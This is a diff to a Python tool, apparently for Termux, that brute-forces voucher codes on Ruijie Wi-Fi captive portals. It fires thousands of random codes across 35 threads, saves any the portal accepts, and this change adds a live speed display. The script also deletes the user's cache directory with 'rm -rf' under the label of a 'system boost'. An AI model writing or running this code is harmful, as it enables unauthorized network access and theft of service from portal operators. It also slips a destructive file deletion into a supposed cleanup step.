@@ -9,7 +9,7 @@ import time
 import httpx
 
 # ====================================================
-# 🌟 RUIJIE ELITE SUITE v5.1 [AUTO-BOOST & CLEAN EXIT]
+# 🌟 RUIJIE ELITE SUITE v5.2 [LIVE SPEED & MONITOR ENGINE]
 # ====================================================
 
 C_CYAN = "\033[96m"
@@ -26,14 +26,14 @@ def clear_screen():
 
 def banner():
     print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.1 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Cyberpunk Multi-Threaded Engine ]       {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.2 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Live Speed & Monitor Engine ]           {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")
 
 def test_code(url, code):
     target_url = f"{url}/portal?code={code}"
     try:
-        response = httpx.get(target_url, timeout=2.5, follow_redirects=True)
+        response = httpx.get(target_url, timeout=2.0, follow_redirects=True)
         if response.status_code == 200 and "success" in response.text.lower():
             return code
     except Exception:
@@ -47,7 +47,7 @@ def save_code(code):
 
 def elite_range_scanner():
     print(f"\n{C_MAGENTA}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_MAGENTA}║         🔥 TURBO ELITE RANGE SCANNER             ║{C_RESET}")
+    print(f"{C_MAGENTA}║         🔥 LIVE TURBO RANGE SCANNER              ║{C_RESET}")
     print(f"{C_MAGENTA}╚══════════════════════════════════════════════════╝{C_RESET}")
     
     portal_url = input(f"{C_YELLOW} ┣ 🌐 Enter Portal URL ➔ {C_WHITE}").strip()
@@ -72,43 +72,51 @@ def elite_range_scanner():
     start_char = start_str[0]
     end_char = end_str[0]
 
-    print(f"\n{C_GREEN}🚀 [Initializing Turbo Scanner] Range: '{start_char}' ➔ '{end_char}' | Length: {length}{C_RESET}\n")
+    print(f"\n{C_GREEN}🚀 [Live Scanner Active] Range: '{start_char}' ➔ '{end_char}' | Length: {length}{C_RESET}\n")
+    print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
     
     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
     found_count = 0
+    scanned_count = 0
     max_workers = 35
 
+    start_time = time.time()
+
     def worker(_):
+        nonlocal scanned_count
         random_mid = ''.join(random.choices(chars, k=length - 1))
         code = start_char + random_mid
+        scanned_count += 1
+        
+        # Live status print (Show checking code & speed)
+        elapsed = time.time() - start_time
+        speed = scanned_count / elapsed if elapsed > 0 else 0
+        sys.stdout.write(f"\r{C_CYAN}[Checking: {code}] | Speed: {speed:.1f} req/s | Found: {found_count}{C_RESET}   ")
+        sys.stdout.flush()
+
         return test_code(portal_url, code)
 
-    start_time = time.time()
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-            futures = [executor.submit(worker, i) for i in range(1500)]
+            # စမ်းသပ်မည့် အရေအတွက် (လိုအပ်ပါက ဤနေရာတွင် တိုးမြှင့်နိုင်သည်)
+            futures = [executor.submit(worker, i) for i in range(2000)]
             
             for future in concurrent.futures.as_completed(futures):
                 result = future.result()
                 if result:
-                    print(f"\n{C_GREEN}{C_BOLD}✨ [BINGO! VALID CODE FOUND] ➔ {result}{C_RESET}")
+                    print(f"\n\n{C_GREEN}{C_BOLD}✨ [BINGO! VALID CODE FOUND] ➔ {result}{C_RESET}")
                     save_code(result)
                     found_count += 1
-                else:
-                    sys.stdout.write(f"{C_CYAN}.{C_RESET}")
-                    sys.stdout.flush()
     except KeyboardInterrupt:
-        print(f"\n{C_RED}⚠️ [Warning] Scan aborted by user interaction.{C_RESET}")
+        print(f"\n\n{C_RED}⚠️ [Warning] Scan aborted by user interaction.{C_RESET}")
 
     elapsed_time = time.time() - start_time
-    print(f"\n\n{C_YELLOW}🏁 [Scan Summary] Time: {elapsed_time:.2f}s | Valid Found: {found_count}{C_RESET}")
+    print(f"\n\n{C_YELLOW}🏁 [Scan Summary] Time: {elapsed_time:.2f}s | Total Scanned: {scanned_count} | Valid Found: {found_count}{C_RESET}")
     print(f"{C_GREEN}💾 Successfully saved to 'valid_codes.txt'.{C_RESET}")
 
 def system_boost_and_exit():
     print(f"\n{C_YELLOW}⚙️ [Boosting System] Cleaning up RAM and cache...{C_RESET}")
-    # Python Memory Garbage Collection
     gc.collect()
-    # Termux temporary files cleanup (if any)
     try:
         os.system("rm -rf ~/.cache/* 2>/dev/null")
     except Exception:
@@ -124,7 +132,7 @@ def main_menu():
         banner()
         print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [1] 🔍 Auto-Detect Wi-Fi Portal URL             {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Launch Cyber Elite Turbo Scanner         {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Launch Live Turbo Scanner                {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost (Memory Clean)       {C_WHITE}│{C_RESET}")
@@ -163,4 +171,4 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
-        
+            
